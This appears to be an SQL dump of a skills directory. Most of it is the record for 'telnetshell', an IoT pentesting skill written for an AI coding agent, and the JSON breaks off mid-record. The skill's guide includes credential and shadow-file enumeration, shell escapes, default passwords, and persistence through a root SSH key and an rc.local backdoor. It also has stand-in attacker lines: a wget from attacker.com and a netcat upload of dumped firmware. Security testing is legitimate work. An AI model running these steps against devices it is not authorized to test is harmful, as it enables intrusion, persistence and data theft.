INSERT INTO skills_fts (id, name, owner, repo, category, search_text) VALUES ('muratcankoylan/Agent-Skills-for-Context-Engineering/project-development', 'project-development', 'muratcankoylan', 'Agent-Skills-for-Context-Engineering', 'community', 'project-development muratcankoylan Agent-Skills-for-Context-Engineering community The project-development skill covers principles for identifying tasks suited to LLM processing and designing effective project architectures. It benefits developers building agent systems that require context management. 项目开发技能是一套综合的Agent技能，用于上下文工程、多代理架构和生产代理系统 プロジェクト開発スキルは、コンテキストエンジニアリング、マルチエージェントアーキテクチャ、プロダクションエージェントシステムを構築するための包括的なエージェントスキル 프로젝트 개발 스킬은 컨텍스트 엔지니어링, 멀티 에이전트 아키텍처 및 프로덕션 에이전트 시스템을 구축하기 위한 포괄적인 에이전트 스킬 El desarrollo de proyectos con Agentes de Inteligencia Artificial implica diseñar arquitecturas efectivas y optimizar sistemas de agentes. Esta habilidad cubre los principios para identificar tareas adecuadas para el procesamiento LLM Le développement de projets avec des Outils d''Intelligence Artificielle implique la conception d''architectures efficaces et l''optimisation de systèmes d''agents. Cette compétence couvre les principes pour identifier les tâches adaptées au traitement LLM Die Projektentwicklung mit KI-Agents umfasst das Entwerfen effektiver Architekturen und das Optimieren von Agentensystemen. Diese Fähigkeit deckt die Prinzipien für die Identifizierung von Aufgaben ab, die für die LLM-Verarbeitung geeignet sind Desenvolvimento de projetos com ferramentas de AI para criação de arquiteturas de agentes e processamento de LLM Разработка проектов с помощью ИИ Агентов для создания архитектуры агентов и обработки LLM تطوير المشاريع باستخدام أدوات الذكاء الاصطناعي لإنشاء هندسة السياق وتحليل LLM how to use project-development project-development setup guide what is project-development project-development vs competitor skills project-development alternative project-development install project-development for LLM processing project-development for multi-agent architectures AIエージェント 项目开发 LLM处理 多代理架构 代理系统优化 批处理管道 交互式代理应用 Applies to batch processing pipelines, multi-agent research systems, and interactive agent applications Enables effective context management for agent systems Supports rapid iteration using agent-assisted development Helps identify tasks suited to LLM processing Covers principles for designing effective project architectures project-development is a comprehensive collection of Agent Skills for context engineering, multi-agent architectures, and production agent systems.');
INSERT OR REPLACE INTO skills (id, category, owner, repo, repo_path, name, stars, forks, quality_score, updated_at, last_synced, content_hash, data_json) VALUES ('BrownFineSecurity/iothackbot/telnetshell', 'community', 'BrownFineSecurity', 'iothackbot', 'BrownFineSecurity/iothackbot', 'telnetshell', 0, 0, 60, '2026-03-08T01:57:15.283Z', '2026-03-08T02:00:54.348Z', 'cbc6597f7298e38d412c457f50a3d2d652fe7f2741e11b3ca4330b6044b349a2', '{"id":"BrownFineSecurity/iothackbot/telnetshell","name":"telnetshell","description":{"en":"The telnetshell skill enables interaction with IoT device shells via telnet for security testing and penetration testing. It benefits IoT security professionals and researchers.","zh":"telnetshell是一种IoT设备安全测试和渗透测试工具，支持无认证shell、弱认证测试、设备枚举和后期利用活动","ja":"telnetshellは、IoTデバイスのセキュリティテストとペネトレーションテストを行うためのツールです。無認証shell、弱認証テスト、デバイス列挙、後期利用活動をサポートします","ko":"telnetshell은 IoT 디바이스 보안 테스트 및 침투 테스트를 위한 도구로, 비인증 셸, 약한 인증 테스트, 디바이스 열거 및 후속 활용 활동을 지원합니다","es":"telnetshell es una habilidad para pruebas de penetración IoT que permite interactuar con shells de dispositivos accesibles vía telnet","fr":"telnetshell est une compétence pour les tests de pénétration IoT qui permet d''interagir avec les shells d''appareils accessibles via telnet","de":"telnetshell ist eine Fähigkeit für IoT-Penetrationsprüfungen, die die Interaktion mit Shells von Geräten ermöglicht, die über Telnet zugänglich sind","pt":"O telnetshell é uma ferramenta de teste de segurança para dispositivos IoT que suporta shells não autenticados e testes de autenticação fraca","ru":"ИИ Агент telnetshell - это инструмент для тестирования безопасности устройств IoT, поддерживающий неаутентифицированные оболочки и тесты на слабую аутентификацию","ar":"وكيل telnetshell هو أداة لاختبار أمن الأجهزة الذكية التي تدعم الشل غير المصرح به وتجارب الاختبار للتحقق الضعيف"},"seo":{"title":{"en":"telnetshell: IoT Penetration Testing Setup Guide | AI Age...","zh":"telnetshell 安全测试指南：IoT 设备shell交互","ja":"telnetshell セットアップガイド：IoT デバイスのセキュリティテスト","ko":"telnetshell 설정 가이드: IoT 디바이스 셸 상호 작용","es":"Guía de configuración de telnetshell para pruebas de pene...","fr":"Guide de configuration de telnetshell pour les tests de p...","de":"Konfigurationsleitfaden für telnetshell zur IoT-Penetrati...","pt":"Guia de Configuração do telnetshell para Testes de Segura...","ru":"Настройка ИИ Агента telnetshell для тестирования IoT","ar":"دليل إعداد telnetshell لاختبار أمن الأجهزة الذكية"},"description":{"en":"Unlock IoT device security testing with telnetshell. Learn how to install and use this AI agent skill for hybrid IoT pentesting and discover vulnerabilities","zh":"了解telnetshell的功能和特点，掌握IoT设备安全测试和渗透测试的方法","ja":"telnetshellの機能と特徴を紹介。IoTデバイスのセキュリティテストとペネトレーションテストを行うためのガイド","ko":"telnetshell의 기능과 특징을 소개합니다. IoT 디바이스 보안 테스트 및 침투 테스트 방법을 학습하세요","es":"Aprende a configurar telnetshell para pruebas de seguridad y penetración en dispositivos IoT con Python y pexpect","fr":"Découvrez comment configurer telnetshell pour les tests de sécurité et de pénétration sur les appareils IoT avec Python et pexpect","de":"Erfahren Sie, wie Sie telnetshell für Sicherheits- und Penetrationsprüfungen auf IoT-Geräten mit Python und pexpect konfigurieren","pt":"Aprenda a configurar o telnetshell para testes de segurança em dispositivos IoT com Python e pexpect","ru":"Узнайте, как настроить ИИ Агент telnetshell для тестирования безопасности устройств IoT с помощью Python и pexpect","ar":"تعرف على كيفية إعداد telnetshell لاختبار أمن الأجهزة الذكية باستخدام Python و pexpect"},"definition":{"en":"telnetshell is a collection of Claude Skills and custom tooling for hybrid IoT pentesting, supporting unauthenticated shells and weak authentication testing","zh":"telnetshell是一种用于IoT设备安全测试和渗透测试的AIエージェント工具","ja":"telnetshellは、IoTデバイスのセキュリティテストとペネトレーションテストを行うためのAIエージェントです","ko":"telnetshell은 IoT 디바이스 보안 테스트 및 침투 테스트를 위한 AI 에이전트 도구입니다","es":"telnetshell es una herramienta de pruebas de penetración para dispositivos IoT que utiliza telnet para acceder a shells de dispositivos","fr":"telnetshell est un outil de test de pénétration pour les appareils IoT qui utilise telnet pour accéder aux shells d''appareils","de":"telnetshell ist ein Tool für Penetrationsprüfungen auf IoT-Geräten, das Telnet verwendet, um auf Geräteshells zuzugreifen","pt":"O que é telnetshell? É uma ferramenta de teste de segurança para dispositivos IoT","ru":"Что такое ИИ Агент telnetshell? Это инструмент для тестирования безопасности устройств IoT","ar":"ما هو telnetshell؟ هو أداة لاختبار أمن الأجهزة الذكية"},"features":{"en":["Supports unauthenticated shells for IoT device security testing","Enables weak authentication testing for identifying vulnerabilities","Performs device enumeration for thorough security assessments","Supports post-exploitation activities for advanced security testing","Utilizes Python 3 with pexpect library for automated testing","Requires telnet client installation for network access to target devices"],"zh":["支持无认证shell","弱认证测试","设备枚举","后期利用活动","使用Python 3和pexpect库","需要telnet客户端"],"ja":["無認証shellをサポート","弱認証テスト","デバイス列挙","後期利用活動","Python 3とpexpectライブラリを使用","telnetクライアントが必要"],"ko":["비인증 셸 지원","약한 인증 테스트","디바이스 열거","후속 활용 활동","Python 3와 pexpect 라이브러리를 사용","telnet 클라이언트가 필요"],"es":["Soporte para shells no autenticados","Pruebas de autenticación débil","Enumeración de dispositivos","Actividades de post-explotación","Compatibilidad con Python 3 y pexpect"],"fr":["Prise en charge des shells non authentifiés","Tests d''authentification faible","Énumération des appareils","Activités de post-exploitation","Compatibilité avec Python 3 et pexpect"],"de":["Unterstützung für nicht authentifizierte Shells","Schwachstellen-Authentifizierungstests","Geräte-Enumerierung","Aktivitäten nach der Ausnutzung","Kompatibilität mit Python 3 und pexpect"],"pt":["Suporte a shells não autenticados","Testes de autenticação fraca","Enumeração de dispositivos","Atividades pós-exploração","Integração com Python e pexpect"],"ru":["Поддержка неаутентифицированных оболочек","Тесты на слабую аутентификацию","Перечисление устройств","Пост-эксплуатационные atividades","Интеграция с Python и pexpect"],"ar":["دعم الشل غير المصرح به","اختبارات التحقق الضعيف","تعداد الأجهزة","أنشطة ما بعد الاستكشاف","التكامل مع Python و pexpect"]},"keywords":{"en":["how to use telnetshell","telnetshell setup guide","IoT penetration testing tools","telnetshell alternative","telnetshell vs nmap","install telnetshell","telnetshell tutorial","what is telnetshell","telnetshell documentation"],"zh":["IoT安全测试","telnetshell","AIエージェント","渗透测试","Python 3","pexpect库","telnet客户端","IoT设备安全"],"ja":["IoTセキュリティテスト","telnetshell","AIエージェント","ペネトレーションテスト","Python 3","pexpectライブラリ","telnetクライアント","IoTデバイスのセキュリティ"],"ko":["IoT 보안 테스트","telnetshell","AI 에이전트","침투 테스트","Python 3","pexpect 라이브러리","telnet 클라이언트","IoT 디바이스 보안"],"es":["telnetshell","pruebas de penetración IoT","seguridad de dispositivos IoT","herramientas de pruebas de penetración","Python para pruebas de penetración","pexpect para pruebas de penetración","IoT HackBot","pruebas de seguridad de dispositivos","pruebas de autenticación débil"],"fr":["telnetshell","tests de pénétration IoT","sécurité des appareils IoT","outils de test de pénétration","Python pour les tests de pénétration","pexpect pour les tests de pénétration","IoT HackBot","tests de sécurité des appareils","tests d''authentification faible"],"de":["telnetshell","IoT-Penetrationsprüfungen","Sicherheit von IoT-Geräten","Penetrationsprüfungstools","Python für Penetrationsprüfungen","pexpect für Penetrationsprüfungen","IoT HackBot","Sicherheitsprüfungen von Geräten","Schwachstellen-Authentifizierungstests"],"pt":["telnetshell","teste de segurança IoT","Python","pexpect","shells não autenticados","testes de autenticação fraca","enumeração de dispositivos","atividades pós-exploração"],"ru":["ИИ Агент telnetshell","тестирование безопасности IoT","Python","pexpect","неаутентифицированные оболочки","тесты на слабую аутентификацию","перечисление устройств","пост-эксплуатационные atividades"],"ar":["وكيل telnetshell","اختبار أمن الأجهزة الذكية","Python","pexpect","الشل غير المصرح به","اختبارات التحقق الضعيف","تعداد الأجهزة","أنشطة ما بعد الاستكشاف"]}},"owner":"BrownFineSecurity","repo":"iothackbot","repoPath":"BrownFineSecurity/iothackbot","stars":0,"forks":0,"updatedAt":"2026-03-08T01:57:15.283Z","topics":[],"category":"community","skillMd":{"name":"telnetshell","description":"Use telnet to interact with IoT device shells for pentesting operations including device enumeration, vulnerability discovery, credential testing, and post-exploitation. Use when the user needs to interact with network-accessible shells, IoT devices, or telnet services.","bodyPreview":"# IoT Telnet Shell (telnetshell)\n\nThis skill enables interaction with IoT device shells accessible via telnet for security testing and penetration testing operations. It supports unauthenticated shells, weak authentication testing, device enumeration, and post-exploitation activities.\n\n## Prerequisites\n\n- Python 3 with pexpect library (`pip install pexpect` or `sudo pacman -S python-pexpect`)\n- telnet client installed on the system (`sudo pacman -S inetutils` on Arch)\n- Network access to the tar","body":"# IoT Telnet Shell (telnetshell)\n\nThis skill enables interaction with IoT device shells accessible via telnet for security testing and penetration testing operations. It supports unauthenticated shells, weak authentication testing, device enumeration, and post-exploitation activities.\n\n## Prerequisites\n\n- Python 3 with pexpect library (`pip install pexpect` or `sudo pacman -S python-pexpect`)\n- telnet client installed on the system (`sudo pacman -S inetutils` on Arch)\n- Network access to the target device''s telnet port\n\n## Recommended Approach: Telnet Helper Script\n\n**IMPORTANT**: This skill includes a Python helper script (`telnet_helper.py`) that provides a clean, reliable interface for telnet communication. **This is the RECOMMENDED method** for interacting with IoT devices.\n\n### Default Session Logging\n\n**ALL commands run by Claude will be logged to `/tmp/telnet_session.log` by default.**\n\nTo observe what Claude is doing in real-time:\n```bash\n# In a separate terminal, run:\ntail -f /tmp/telnet_session.log\n```\n\nThis allows you to watch all telnet I/O as it happens without interfering with the connection.\n\n### Why Use the Telnet Helper?\n\nThe helper script solves many problems with direct telnet usage:\n- **Clean output**: Automatically removes command echoes, prompts, and ANSI codes\n- **Prompt detection**: Automatically detects and waits for device prompts\n- **Timeout handling**: Proper timeout management with no arbitrary sleeps\n- **Easy scripting**: Simple command-line interface for single commands or batch operations\n- **Session logging**: All I/O logged to `/tmp/telnet_session.log` for observation\n- **Reliable**: No issues with TTY requirements or background processes\n- **JSON output**: For programmatic parsing and tool chaining\n\n### Quick Start with Telnet Helper\n\n**Single Command:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"uname -a\"\n```\n\n**Custom Port:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --command \"ls /\"\n```\n\n**With Custom Prompt (recommended for known devices):**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --prompt \"^/ [#\\$]\" --command \"ifconfig\"\n```\n\n**Interactive Mode:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --interactive\n```\n\n**Batch Commands from File:**\n```bash\n# Create a file with commands (one per line)\necho -e \"uname -a\\ncat /proc/version\\nifconfig\\nps\" > commands.txt\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --script commands.txt\n```\n\n**JSON Output (for parsing):**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"uname -a\" --json\n```\n\n**Debug Mode:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"ls\" --debug\n```\n\n**Session Logging (for observation):**\n```bash\n# Terminal 1 - Run with logging\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --logfile /tmp/session.log \\\n  --interactive\n\n# Terminal 2 - Watch the session in real-time\ntail -f /tmp/session.log\n```\n\n**Note:** See `OBSERVING_SESSIONS.md` for comprehensive guide on monitoring telnet sessions.\n\n### Telnet Helper Options\n\n```\nRequired (one of):\n  --command, -c CMD         Execute single command\n  --interactive, -i         Enter interactive mode\n  --script, -s FILE         Execute commands from file\n\nConnection Options:\n  --host, -H HOST           Target host IP or hostname (required)\n  --port, -P PORT           Telnet port (default: 23)\n  --timeout, -t SECONDS     Command timeout (default: 3.0)\n  --prompt, -p PATTERN      Custom prompt regex pattern\n\nOutput Options:\n  --raw, -r                 Don''t clean output (show echoes, prompts)\n  --json, -j                Output in JSON format\n  --logfile, -l FILE        Log all I/O to file (default: /tmp/telnet_session.log)\n  --debug                   Show debug information\n```\n\n### Common Prompt Patterns\n\nThe helper script includes common prompt patterns, but you can specify custom ones:\n\n```bash\n# BusyBox shell (common on IoT)\n--prompt \"/\\s*[#\\$]\\s*$\"\n\n# Standard root/user prompts\n--prompt \"^[#\\$]\\s*$\"\n\n# Custom device\n--prompt \"^MyDevice>\\s*$\"\n\n# Uniview cameras\n--prompt \"^User@[^>]+>\\s*$\"\n```\n\n### Device Enumeration Example with Telnet Helper\n\nHere''s a complete example of safely enumerating a device:\n\n```bash\n# Set variables for convenience\nHELPER=\"python3 .claude/skills/telnetshell/telnet_helper.py\"\nHOST=\"192.168.1.100\"\nPORT=\"2222\"\nLOGFILE=\"/tmp/telnet_session.log\"\n\n# System information\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"uname -a\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"cat /proc/version\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"cat /proc/cpuinfo\"\n\n# Check for BusyBox\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"busybox\"\n\n# Network configuration\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"ifconfig\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"route -n\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"netstat -tulpn\"\n\n# Process listing (may need longer timeout)\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --timeout 5 --command \"ps aux\"\n\n# File system exploration\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"ls -la /\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"mount\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"df -h\"\n\n# Security assessment\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"cat /etc/passwd\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"find / -perm -4000 2>/dev/null\"\n```\n\n**IMPORTANT FOR CLAUDE CODE**: When using this skill, ALWAYS include `--logfile /tmp/telnet_session.log` in every command so the user can monitor activity with `tail -f /tmp/telnet_session.log`.\n\n## Instructions\n\n### 1. Connection Setup\n\n**Default connection:**\n- **Port**: 23 (standard telnet, override with `--port`)\n- **Timeout**: 3 seconds (override with `--timeout`)\n- **Logging**: `/tmp/telnet_session.log` by default\n\n**Common telnet ports on IoT devices:**\n- 23: Standard telnet port\n- 2222: Alternative telnet port (common on cameras)\n- 8023: Alternative telnet port\n- Custom ports: Check device documentation or nmap scan results\n\n### 2. BusyBox Shells (Most IoT Devices)\n\n**IMPORTANT**: The vast majority of IoT devices use BusyBox, a lightweight suite of Unix utilities designed for embedded systems. BusyBox provides a minimal shell environment with limited command functionality.\n\n**Identifying BusyBox:**\n```bash\n# Check what shell you''re using\nbusybox\nbusybox --help\n\n# Or check symlinks\nls -la /bin/sh\n# Often shows: /bin/sh -> /bin/busybox\n\n# List available BusyBox applets\nbusybox --list\n```\n\n**BusyBox Limitations:**\n- Many standard Linux commands may be simplified versions\n- Some common flags/options may not be available\n- Features like tab completion may be limited or absent\n- Some exploitation techniques that work on full Linux may not work\n\n**Common BusyBox commands available:**\n```bash\n# Core utilities (usually available)\ncat, ls, cd, pwd, echo, cp, mv, rm, mkdir, chmod, chown\nps, kill, top, free, df, mount, umount\ngrep, find, sed, awk (limited versions)\nifconfig, route, ping, netstat, telnet\nvi (basic text editor - no syntax highlighting)\n\n# Check what''s available\nbusybox --list | sort\nls /bin /sbin /usr/bin /usr/sbin\n```\n\n**BusyBox-specific considerations for pentesting:**\n- `ps` output format may differ from standard Linux\n- Some privilege escalation techniques require commands not in BusyBox\n- File permissions still work the same (SUID, sticky bits, etc.)\n- Networking tools are often present (telnet, wget, nc/netcat, ftpget)\n- Python/Perl/Ruby are usually NOT available (device storage constraints)\n\n**Useful BusyBox commands for enumeration:**\n```bash\n# Check BusyBox version (may have known vulnerabilities)\nbusybox | head -1\n\n# Network utilities often available\nnc -l -p 4444  # Netcat listener\nwget http://attacker.com/shell.sh\nftpget server file\ntelnet 192.168.1.1\n\n# httpd (web server) often included\nbusybox httpd -p 8080 -h /tmp  # Quick file sharing\n```\n\n### 3. Device Enumeration\n\nOnce you have shell access, gather the following information:\n\n**System Information:**\n```bash\n# Kernel and system info\nuname -a\ncat /proc/version\ncat /proc/cpuinfo\ncat /proc/meminfo\n\n# Distribution/firmware info\ncat /etc/issue\ncat /etc/*release*\ncat /etc/*version*\n\n# Hostname and network\nhostname\ncat /etc/hostname\nifconfig -a\ncat /etc/network/interfaces\ncat /etc/resolv.conf\n\n# Mounted filesystems\nmount\ncat /proc/mounts\ndf -h\n\n# Running processes\nps aux\nps -ef\ntop -b -n 1\n```\n\n**User and Permission Information:**\n```bash\n# Current user context\nid\nwhoami\ngroups\n\n# User accounts\ncat /etc/passwd\ncat /etc/shadow  # If readable - major security issue!\ncat /etc/group\n\n# Sudo/privilege info\nsudo -l\ncat /etc/sudoers\n```\n\n**Network Services:**\n```bash\n# Listening services\nnetstat -tulpn\nlsof -i\n\n# Firewall rules\niptables -L -n -v\ncat /etc/iptables/*\n```\n\n**Interesting Files and Directories:**\n```bash\n# Configuration files\nls -la /etc/\nfind /etc/ -type f -readable\n\n# Web server configs\nls -la /etc/nginx/\nls -la /etc/apache2/\nls -la /var/www/\n\n# Credentials and keys\nfind / -name \"*.pem\" 2>/dev/null\nfind / -name \"*.key\" 2>/dev/null\nfind / -name \"*password*\" 2>/dev/null\nfind / -name \"*credential*\" 2>/dev/null\ngrep -r \"password\" /etc/ 2>/dev/null\n\n# SUID/SGID binaries (privilege escalation vectors)\nfind / -perm -4000 -type f 2>/dev/null\nfind / -perm -2000 -type f 2>/dev/null\n\n# World-writable files/directories\nfind / -perm -2 -type f 2>/dev/null\nfind / -perm -2 -type d 2>/dev/null\n\n# Development/debugging tools\nwhich gdb gcc python perl ruby tcpdump\nls /usr/bin/ /bin/ /sbin/ /usr/sbin/\n```\n\n### 4. Privilege Escalation (if not root)\n\n**Check for common vulnerabilities:**\n```bash\n# Kernel exploits\nuname -r  # Check kernel version for known exploits\n\n# Check for exploitable services\nps aux | grep root\n\n# Writable service files\nfind /etc/init.d/ -writable 2>/dev/null\n\n# Cron jobs\ncrontab -l\nls -la /etc/cron*\ncat /etc/crontab\n```\n\n### 5. Persistence and Further Access\n\n**Establish additional access methods:**\n```bash\n# Add SSH access (if SSH is available)\nmkdir -p /root/.ssh\necho \"your_ssh_public_key\" >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\nchmod 700 /root/.ssh\n\n# Start SSH service (if not running)\n/etc/init.d/ssh start\n# or\n/etc/init.d/sshd start\n# or\n/etc/init.d/dropbear start  # Common on embedded devices\n\n# Add to startup scripts\necho \"/path/to/backdoor &\" >> /etc/rc.local\n```\n\n### 6. Firmware Extraction\n\n**Extract firmware for offline analysis:**\n```bash\n# Find MTD partitions (common on embedded devices)\ncat /proc/mtd\ncat /proc/partitions\n\n# Dump flash partitions\ndd if=/dev/mtd0 of=/tmp/bootloader.bin\ndd if=/dev/mtd1 of=/tmp/kernel.bin\ndd if=/dev/mtd2 of=/tmp/rootfs.bin\n\n# Copy to external storage or network\n# If network is available:\nnc attacker_ip 4444 < /tmp/rootfs.bin\n\n# If HTTP server is available:\ncd /tmp\nbusybox httpd -p 8000\n# Then download from http://device_ip:8000/rootfs.bin\n```\n\n## Common IoT Device Scenarios\n\n### Scenario 1: No Authentication Shell\n```bash\n# Connect - drops directly to root shell\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --interactive\n# Enumerate and exploit\n```\n\n### Scenario 2: Custom Port No-Auth Shell\n```bash\n# Many IoT cameras use port 2222\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --interactive\n```\n\n### Scenario 3: Password-Protected Shell\n```bash\n# If you encounter a password prompt, the helper will detect it\n# Try default credentials:\n# - root/root\n# - admin/admin\n# - root/(empty)\n# Search online for device-specific defaults\n```\n\n### Scenario 4: Limited Shell Escape\n```bash\n# If you get a limited shell:\n# Try common escape techniques:\necho $SHELL\n/bin/sh\n/bin/bash\nvi  # Then :!/bin/sh\nless /etc/passwd  # Then !/bin/sh\nfind / -exec /bin/sh \\;\nawk ''BEGIN {system(\"/bin/sh\")}''\n```\n\n## Security Testing Checklist\n\n- [ ] Identify device and firmware version\n- [ ] Check for unauthenticated access\n- [ ] Test for default/weak credentials\n- [ ] Enumerate network services and open ports\n- [ ] Check for hardcoded credentials in files\n- [ ] Test for command injection vulnerabilities\n- [ ] Check file permissions (SUID, world-writable)\n- [ ] Check for outdated software with known CVEs\n- [ ] Test for privilege escalation vectors\n- [ ] Extract firmware for offline analysis\n- [ ] Document all findings with screenshots/logs\n\n## Best Practices\n\n1. **Always log your session**: Default logfile is `/tmp/telnet_session.log`\n2. **Document everything**: Take notes on commands, responses, and findings\n3. **Use batch scripts**: Create enumeration scripts for common tasks\n4. **Research the device**: Look up known vulnerabilities, default credentials, and common issues\n5. **Use proper authorization**: Only perform pentesting on devices you own or have explicit permission to test\n6. **Be careful with destructive commands**: Avoid commands that could brick devices or corrupt data\n7. **Monitor your session**: Use `tail -f` in another terminal to watch activity\n\n## Troubleshooting\n\n**Problem: Connection refused**\n- Solution: Check if telnet service is running, verify port number, check firewall rules\n\n**Problem: Connection timeout**\n- Solution: Verify network connectivity, check if device is powered on, verify IP address\n\n**Problem: \"Permission denied\"**\n- Solution: Telnet service may require authentication, try default credentials\n\n**Problem: Commands not echoing**\n- Solution: Use `--raw` flag to see unfiltered output\n\n**Problem: Garbled output or wrong prompt detection**\n- Solution: Use `--prompt` flag with custom regex pattern for your specific device\n\n## Pre-built Enumeration Scripts\n\nThe skill includes pre-built enumeration scripts for common tasks:\n\n- `enum_system.txt`: System information gathering\n- `enum_network.txt`: Network configuration enumeration\n- `enum_files.txt`: File system exploration\n- `enum_security.txt`: Security-focused enumeration\n\n**Usage:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --script .claude/skills/telnetshell/enum_system.txt\n```\n\n## Example Usage\n\n```bash\n# Basic connection to standard telnet port\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"uname -a\"\n\n# Connection to custom port (common for IoT cameras)\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --command \"ls /\"\n\n# Interactive session with logging\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --logfile /tmp/camera_session.log \\\n  --interactive\n\n# Batch enumeration\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --script enum_system.txt \\\n  --json > results.json\n\n# Long-running command with custom timeout\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --timeout 10 \\\n  --command \"find / -name ''*.conf''\"\n```\n\n## References\n\n- [BusyBox Official Site](https://busybox.net/)\n- [BusyBox Command List](https://busybox.net/downloads/BusyBox.html)\n- IoT pentesting resources and vulnerability databases\n- Device-specific documentation and datasheets\n"},"lastSynced":"2026-03-08T02:00:54.348Z","agentAnalysis":{"suitability":{"en":"Ideal for Network Security Agents requiring advanced IoT device penetration testing capabilities via telnet","zh":"适合需要通过 telnet 进行高级 IoT 设备渗透测试的网络安全代理","ja":"telnet を介して高度な IoT デバイスのペネトレーション テスト機能を必要とするネットワーク セキュリティ エージェントに適しています","ko":"텔넷을 통해 고급 IoT 장치 침투 테스트 기능을 필요한 네트워크 보안 에이전트에 적합합니다","es":"Ideal para Agentes de Seguridad de Red que requieren capacidades avanzadas de pruebas de penetración de dispositivos IoT a través de telnet","fr":"Idéal pour les agents de sécurité réseau nécessitant des capacités de test de pénétration de dispositifs IoT avancées via telnet","de":"Ideal für Netzwerksicherheitsagenten, die erweiterte IoT-Geräte-Penetrationstest-Funktionen über telnet benötigen","pt":"Ideal para Agentes de Segurança de Rede que exigem capacidades avançadas de teste de penetração de dispositivos IoT via telnet","ru":"Идеально подходит для агентов сетевой безопасности, требующих расширенных возможностей тестирования проникновения устройств IoT через telnet","ar":"مثالي للوكلاء أمن الشبكة الذين يتطلبون قدرات اختبار الاختراق المتقدمة لأجهزة IoT عبر telnet"},"recommendation":{"en":"Empowers agents to interact with IoT device shells using telnet for security testing and penetration testing, leveraging the pexpect library for unauthenticated shells, weak authentication testing, and post-exploitation activities over the telnet protocol","zh":"赋予代理使用 telnet 与 IoT 设备 shells 交互进行安全测试和渗透测试的能力，利用 pexpect 库进行未经验证的 shells、弱身份验证测试和 telnet 协议上的后期开发活动","ja":"telnet を使用して IoT デバイスのシェルとやり取りしてセキュリティ テストとペネトレーション テストを行うエージェントの能力を提供し、pexpect ライブラリを使用して認証されていないシェル、弱い認証のテスト、および telnet プロトコルの後の開発活動を行う","ko":"텔넷을 사용하여 IoT 장치 셸과 상호 작용하여 보안 테스트 및 침투 테스트를 수행할 수 있는 에이전트의 능력을 제공하며, pexpect 라이브러리를 사용하여 인증되지 않은 셸, 약한 인증 테스트 및 텔넷 프로토콜의 후속 개발 활동을 수행한다","es":"Habilita a los agentes a interactuar con capas de dispositivos IoT utilizando telnet para pruebas de seguridad y pruebas de penetración, aprovechando la biblioteca pexpect para capas no autenticadas, pruebas de autenticación débil y actividades posteriores a la explotación sobre el protocolo telnet","fr":"Permet aux agents d''interagir avec les coquilles de dispositifs IoT en utilisant telnet pour les tests de sécurité et les tests de pénétration, en exploitant la bibliothèque pexpect pour les coquilles non authentifiées, les tests d''authentification faible et les activités post-exploitation sur le protocole telnet","de":"Ermächtigt Agenten, mit IoT-Geräte-Shells über telnet für Sicherheitstests und Penetrationstests zu interagieren, indem die pexpect-Bibliothek für nicht authentifizierte Shells, schwache Authentifizierungstests und postexploitative Aktivitäten über das telnet-Protokoll genutzt wird","pt":"Habilita os agentes a interagir com shells de dispositivos IoT usando telnet para testes de segurança e teste de penetração, utilizando a biblioteca pexpect para shells não autenticados, testes de autenticação fraca e atividades pós-exploração sobre o protocolo telnet","ru":"Позволяет агентам взаимодействовать с оболочками устройств IoT с помощью telnet для тестирования безопасности и проникновения, используя библиотеку pexpect для неавторизованных оболочек, тестирования слабой аутентификации и пост-эксплуатационных действий по протоколу telnet","ar":"يمنح الوكلاء القدرة على التفاعل مع أصداف أجهزة IoT باستخدام telnet لاختبار الأمان واختبار الاختراق ، باستخدام مكتبة pexpect للتحقق من الصلاحية غير المصرح بها واختبار المصادقة الضعيفة وأنشطة ما بعد الاستغلال عبر بروتوكول telnet"},"useCases":{"en":["Automating IoT device vulnerability assessments","Enumerating device capabilities via telnet","Conducting post-exploitation activities on compromised devices"],"zh":["自动化 IoT 设备漏洞评估","通过 telnet 枚举设备功能","在受损设备上进行后期开发活动"],"ja":["IoT デバイスの脆弱性評価を自動化する","telnet を介してデバイス機能を列挙する","侵害されたデバイスで後期開発活動を実行する"],"ko":["IoT 장치 취약성 평가를 자동화한다","텔넷을 통해 장치 기능을 열거한다","침해된 장치에서 후속 개발 활동을 수행한다"],"es":["Automatizar evaluaciones de vulnerabilidades de dispositivos IoT","Enumarar capacidades de dispositivos via telnet","Realizar actividades posteriores a la explotación en dispositivos 